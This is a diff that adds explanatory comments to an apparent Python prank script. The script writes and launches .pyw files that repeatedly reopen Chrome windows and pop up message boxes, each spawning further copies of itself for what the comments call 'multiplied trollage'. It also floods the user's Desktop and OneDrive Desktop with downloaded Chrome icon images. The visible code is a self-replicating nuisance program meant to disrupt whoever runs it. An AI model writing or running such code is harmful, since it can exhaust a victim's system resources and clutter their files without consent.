@@ -13,6 +13,8 @@ import urllib.request
 
 
 def main():
+    # creates a new file - this is used so multiple trollings could happen at once :^)
+    # opens a new chrome window, and opens itself multiple times
     f = open('chrome.pyw', 'w')
     f.write('''import os
 import subprocess
@@ -29,6 +31,10 @@ def open1():
 open1()
 ''')
     f.close()
+
+    # creates a new file - this is used so multiple trollings could happen at once :^)
+    # opens up a message box with one of the strings in the possible_strings array, chosen pseudo-randomly
+    # also opens up multiple instances of itself for multiplied trollage :)
 
     f2 = open('YouveBeenChromed.pyw', 'w')
     f2.write('''import subprocess
@@ -57,6 +63,8 @@ getChromed()
     subprocess.call('py YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
 
     url = "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Google_Chrome_icon_(September_2014).svg/1200px-Google_Chrome_icon_(September_2014).svg.png"
+
+    # creates lots of images on the desktop of the chrome icon
     num = 1
     desktop = os.path.join(os.environ["HOMEPATH"], "Desktop")
     os.chdir(desktop)
@@ -66,6 +74,7 @@ getChromed()
             img.write(r.read())
         num = num + 1
 
+    # creates lots of images in the onedrive desktop
     num = 1
     desktop = os.path.join(os.environ["HOMEPATH"], "OneDrive/Desktop")
     os.chdir(desktop)
